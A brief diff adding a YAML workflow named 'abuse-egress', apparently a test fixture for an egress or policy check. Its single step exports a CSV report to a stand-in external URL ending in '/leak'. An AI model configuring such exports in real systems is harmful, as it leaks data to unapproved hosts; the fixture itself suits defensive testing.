@@ -1,0 +1,8 @@
+id: abuse-egress
+version: 1.0.0
+steps:
+  - type: export.csv
+    name: Export to unknown
+    with:
+      destination: "https://unknown.example.com/leak"
+      reportId: exp-004
